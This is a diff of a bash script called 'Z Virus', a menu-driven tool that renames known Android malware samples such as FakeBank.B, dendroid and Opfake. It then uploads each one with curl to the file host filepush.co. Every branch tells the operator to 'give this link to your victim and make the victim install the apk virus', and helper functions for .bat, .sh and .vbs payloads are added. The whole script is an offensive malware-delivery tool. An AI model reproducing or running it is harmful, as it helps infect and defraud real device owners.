@@ -1,5 +1,6 @@
 #!/bin/bash
 clear
+# BANNER 
 echo -e "\e[92m ▒███████▒    ██▒   █▓ ██▓ ██▀███   █    ██   ██████ "
 echo -e " ▒ ▒ ▒ ▄▀░   ▓██░   █▒▓██▒▓██ ▒ ██▒ ██  ▓██▒▒██    ▒ "
 echo -e " ░ ▒ ▄▀▒░     ▓██  █▒░▒██▒▓██ ░▄█ ▒▓██  ▒██░░ ▓██▄   "
@@ -10,12 +11,34 @@ echo -e " ░░▒ ▒ ░ ▒      ░ ░░   ▒ ░  ░▒ ░ ▒░░�
 echo -e " ░ ░ ░ ░ ░        ░░   ▒ ░  ░░   ░  ░░░ ░ ░ ░  ░  ░  "
 echo -e "   ░ ░             ░   ░     ░        ░           ░  "
 echo -e " ░                ░                                  \e[0m"
-echo -e "\e[91m     --- Z Virus version 1.0 | Coded By: Zech ---\e[0m"
+echo -e "\e[91m     --- Z Virus version 1.1 | Coded By: Zech ---\e[0m"
 echo -e "\e[34m\"If you are too lazy to type a single command,"
 echo -e " Allow my programs to do it for you.\"\e[0m"
 echo -e " -\e[90m(https://github.com/ZechBron)\e[0m\n"
 
-#BANNER
+# APK 
+apk() {
+   echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
+   curl --upload-file $newName.apk https://filepush.co/upload/$newName.apk
+   rm -f $newName.apk
+}
+# EXE
+exe() {
+   echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
+   curl --upload-file $newName.bat https://filepush.co/upload/$newName.bat
+   rm -f $newName.bat
+}
+# SH
+sh() {
+   echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
+   curl --upload-file $newName.sh https://filepush.co/upload/$newName.sh
+   rm -f $newName.sh
+}
+etc() {
+   echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
+   curl --upload-file $newName.vbs https://filepush.co/upload/$newName.vbs
+   rm -f $newName.vbs
+}
 
 echo -e "\e[32mWhat do you want?\e[0m"
 echo -e "\e[36m 1. Android - apk virus"
@@ -82,9 +105,7 @@ if [ $zCh = 1 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv Agent.apk $newName.apk
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
-         curl --upload-file $newName.apk https://filepush.co/upload/$newName.apk
-         rm -f $newName.apk
+         apk
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
          curl --upload-file Agent.apk https://filepush.co/upload/Agent.apk
@@ -101,9 +122,7 @@ if [ $zCh = 1 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv BadNews.A.apk $newName.apk
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
-         curl --upload-file $newName.apk https://filepush.co/upload/$newName.apk
-         rm -f $newName.apk
+         apk
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
          curl --upload-file BadNews.A.apk https://filepush.co/upload/BadNews.A.apk
@@ -119,9 +138,7 @@ if [ $zCh = 1 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv Bios.NativeMaliciousCode.apk $newName.apk
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
-         curl --upload-file $newName.apk https://filepush.co/upload/$newName.apk
-         rm -f $newName.apk
+         apk
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
          curl --upload-file Bios.NativeMaliciousCode.apk https://filepush.co/upload/Bios.NativeMaliciousCode.apk
@@ -137,9 +154,7 @@ if [ $zCh = 1 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv Blatantsms.apk $newName.apk
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
-         curl --upload-file $newName.apk https://filepush.co/upload/$newName.apk
-         rm -f $newName.apk
+         apk
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
          curl --upload-file Blantantsms.apk https://filepush.co/upload/Blatantsms.apk
@@ -155,9 +170,7 @@ if [ $zCh = 1 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv BrainTest.apk $newName.apk
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
-         curl --upload-file $newName.apk https://filepush.co/upload/$newName.apk
-         rm -f $newName.apk
+         apk
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
          curl --upload-file BrainTest.apk https://filepush.co/upload/BrainTest.apk
@@ -173,9 +186,7 @@ if [ $zCh = 1 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv Claco.A.apk $newName.apk
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
-         curl --upload-file $newName.apk https://filepush.co/upload/$newName.apk
-         rm -f $newName.apk
+         apk
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
          curl --upload-file Claco.A.apk https://filepush.co/upload/Claco.A.apk
@@ -191,9 +202,7 @@ if [ $zCh = 1 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv Dropdialer.apk $newName.apk
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
-         curl --upload-file $newName.apk https://filepush.co/upload/$newName.apk
-         rm -f $newName.apk
+         apk
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
          curl --upload-file Dropdialer.apk https://filepush.co/upload/Dropdialer.apk
@@ -209,9 +218,7 @@ if [ $zCh = 1 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv FakeBank.B.apk $newName.apk
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
-         curl --upload-file $newName.apk https://filepush.co/upload/$newName.apk
-         rm -f $newName.apk
+         apk
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
          curl --upload-file FakeBank.B.apk https://filepush.co/upload/FakeBank.B.apk
@@ -227,9 +234,7 @@ if [ $zCh = 1 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv FakeCMCC.A.apk $newName.apk
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
-         curl --upload-file $newName.apk https://filepush.co/upload/$newName.apk
-         rm -f $newName.apk
+         apk
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
          curl --upload-file FakeCMCC.A.apk https://filepush.co/upload/FakeCMCC.A.apk
@@ -245,9 +250,7 @@ if [ $zCh = 1 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv FakeDoc.apk $newName.apk
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
-         curl --upload-file $newName.apk https://filepush.co/upload/$newName.apk
-         rm -f $newName.apk
+         apk
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
          curl --upload-file FakeDoc.apk https://filepush.co/upload/FakeDoc.apk
@@ -263,9 +266,7 @@ if [ $zCh = 1 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv FakeValidation.apk $newName.apk
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
-         curl --upload-file $newName.apk https://filepush.co/upload/$newName.apk
-         rm -f $newName.apk
+         apk
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
          curl --upload-file FakeValidation.apk https://filepush.co/upload/FakeValidation.apk
@@ -281,9 +282,7 @@ if [ $zCh = 1 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv Fobus.apk $newName.apk
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
-         curl --upload-file $newName.apk https://filepush.co/upload/$newName.apk
-         rm -f $newName.apk
+         apk
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
          curl --upload-file Fobus.apk https://filepush.co/upload/Fobus.apk
@@ -299,9 +298,7 @@ if [ $zCh = 1 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv GinMaster.Z.AdvancedObfuscation.apk $newName.apk
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
-         curl --upload-file $newName.apk https://filepush.co/upload/$newName.apk
-         rm -f $newName.apk
+         apk
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
          curl --upload-file GinMaster.Z.AdvancedObfuscation.apk https://filepush.co/upload/GinMaster.Z.AdvancedObfuscation.apk
@@ -317,9 +314,7 @@ if [ $zCh = 1 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv Masnu.apk $newName.apk
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
-         curl --upload-file $newName.apk https://filepush.co/upload/$newName.apk
-         rm -f $newName.apk
+         apk
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
          curl --upload-file Masnu.apk https://filepush.co/upload/Masnu.apk
@@ -336,9 +331,7 @@ if [ $zCh = 1 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv Omigo.apk $newName.apk
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
-         curl --upload-file $newName.apk https://filepush.co/upload/$newName.apk
-         rm -f $newName.apk
+         apk
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
          curl --upload-file Omigo.apk https://filepush.co/upload/Omigo.apk
@@ -354,9 +347,7 @@ if [ $zCh = 1 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv Opfake.apk $newName.apk
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
-         curl --upload-file $newName.apk https://filepush.co/upload/$newName.apk
-         rm -f $newName.apk
+         apk
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
          curl --upload-file Opfake.apk https://filepush.co/upload/Opfake.apk
@@ -372,9 +363,7 @@ if [ $zCh = 1 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv SmsWorker.apk $newName.apk
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
-         curl --upload-file $newName.apk https://filepush.co/upload/$newName.apk
-         rm -f $newName.apk
+         apk
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
          curl --upload-file SmsWorker.apk https://filepush.co/upload/SmsWorker.apk
@@ -390,9 +379,7 @@ if [ $zCh = 1 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv Vietcon.apk $newName.apk
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
-         curl --upload-file $newName.apk https://filepush.co/upload/$newName.apk
-         rm -f $newName.apk
+         apk
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
          curl --upload-file Vietcon.apk https://filepush.co/upload/Vietcon.apk
@@ -408,9 +395,7 @@ if [ $zCh = 1 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv candy_corn.apk $newName.apk
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
-         curl --upload-file $newName.apk https://filepush.co/upload/$newName.apk
-         rm -f $newName.apk
+         apk
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
          curl --upload-file candy_corn.apk https://filepush.co/upload/candy_corn.apk
@@ -426,9 +411,7 @@ if [ $zCh = 1 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv cat.apk $newName.apk
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
-         curl --upload-file $newName.apk https://filepush.co/upload/$newName.apk
-         rm -f $newName.apk
+         apk
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
          curl --upload-file cat.apk https://filepush.co/upload/cat.apk
@@ -444,9 +427,7 @@ if [ $zCh = 1 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv chistrscortos.apk $newName.apk
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
-         curl --upload-file $newName.apk https://filepush.co/upload/$newName.apk
-         rm -f $newName.apk
+         apk
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
          curl --upload-file chistescortos.apk https://filepush.co/upload/chistescortos.apk
@@ -462,9 +443,7 @@ if [ $zCh = 1 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv chistespicanticos.apk $newName.apk
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
-         curl --upload-file $newName.apk https://filepush.co/upload/$newName.apk
-         rm -f $newName.apk
+         apk
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
          curl --upload-file chistespicanticos.apk https://filepush.co/upload/chistespicanticos.apk
@@ -480,9 +459,7 @@ if [ $zCh = 1 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv com.funnyys.apk $newName.apk
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
-         curl --upload-file $newName.apk https://filepush.co/upload/$newName.apk
-         rm -f $newName.apk
+         apk
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
          curl --upload-file com.funnyys.apk https://filepush.co/upload/com.funnyys.apk
@@ -498,9 +475,7 @@ if [ $zCh = 1 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv com.imagepets.apk $newName.apk
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
-         curl --upload-file $newName.apk https://filepush.co/upload/$newName.apk
-         rm -f $newName.apk
+         apk
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
          curl --upload-file com.imagepets.apk https://filepush.co/upload/com.imagepets.apk
@@ -516,9 +491,7 @@ if [ $zCh = 1 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv com.kitchenn.apk $newName.apk
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
-         curl --upload-file $newName.apk https://filepush.co/upload/$newName.apk
-         rm -f $newName.apk
+         apk
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
          curl --upload-file com.kitchenn.apk https://filepush.co/upload/com.kitchenn.apk
@@ -534,9 +507,7 @@ if [ $zCh = 1 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv com.laughtter.apk $newName.apk
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
-         curl --upload-file $newName.apk https://filepush.co/upload/$newName.apk
-         rm -f $newName.apk
+         apk
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
          curl --upload-file com.laughtter.apk https://filepush.co/upload/comlaughtter.apk
@@ -552,9 +523,7 @@ if [ $zCh = 1 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv com.prasesamor.apk $newName.apk
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
-         curl --upload-file $newName.apk https://filepush.co/upload/$newName.apk
-         rm -f $newName.apk
+         apk
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
          curl --upload-file com.prasesamor.apk https://filepush.co/upload/com.prasesamor.apk
@@ -570,9 +539,7 @@ if [ $zCh = 1 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv com.prasesfee.apk $newName.apk
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
-         curl --upload-file $newName.apk https://filepush.co/upload/$newName.apk
-         rm -f $newName.apk
+         apk
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
          curl --upload-file com.prasesfee.apk https://filepush.co/upload/com.prasesfee.apk
@@ -588,9 +555,7 @@ if [ $zCh = 1 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv com.recipesmart.apk $newName.apk
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
-         curl --upload-file $newName.apk https://filepush.co/upload/$newName.apk
-         rm -f $newName.apk
+         apk
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
          curl --upload-file com.recipesmart.apk https://filepush.co/upload/com.recipesmart.apk
@@ -606,9 +571,7 @@ if [ $zCh = 1 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv com.romanticpos.apk $newName.apk
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
-         curl --upload-file $newName.apk https://filepush.co/upload/$newName.apk
-         rm -f $newName.apk
+         apk
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
          curl --upload-file com.romanticpos.apk https://filepush.co/upload/com.romanticpos.apk
@@ -624,9 +587,7 @@ if [ $zCh = 1 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv com.statetss.apk $newName.apk
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
-         curl --upload-file $newName.apk https://filepush.co/upload/$newName.apk
-         rm -f $newName.apk
+         apk
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
          curl --upload-file com.statetss.apk https://filepush.co/upload/com.statetss.apk
@@ -642,9 +603,7 @@ if [ $zCh = 1 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv com.thinkking.apk $newName.apk
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
-         curl --upload-file $newName.apk https://filepush.co/upload/$newName.apk
-         rm -f $newName.apk
+         apk
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
          curl --upload-file com.thinkking.apk https://filepush.co/upload/com.thinkking.apk
@@ -660,9 +619,7 @@ if [ $zCh = 1 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv crd.apk $newName.apk
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
-         curl --upload-file $newName.apk https://filepush.co/upload/$newName.apk
-         rm -f $newName.apk
+         apk
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
          curl --upload-file crd.apk https://filepush.co/upload/crd.apk
@@ -678,9 +635,7 @@ if [ $zCh = 1 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv dendroid.apk $newName.apk
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
-         curl --upload-file $newName.apk https://filepush.co/upload/$newName.apk
-         rm -f $newName.apk
+         apk
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
          curl --upload-file dendroid.apk https://filepush.co/upload/dendroid.apk
@@ -696,9 +651,7 @@ if [ $zCh = 1 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv ds.apk $newName.apk
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
-         curl --upload-file $newName.apk https://filepush.co/upload/$newName.apk
-         rm -f $newName.apk
+         apk
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
          curl --upload-file ds.apk https://filepush.co/upload/ds.apk
@@ -714,9 +667,7 @@ if [ $zCh = 1 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv fake_av.apk $newName.apk
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
-         curl --upload-file $newName.apk https://filepush.co/upload/$newName.apk
-         rm -f $newName.apk
+         apk
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
          curl --upload-file fake_av.apk https://filepush.co/upload/fake_av.apk
@@ -732,9 +683,7 @@ if [ $zCh = 1 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv Grave.apk $newName.apk
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
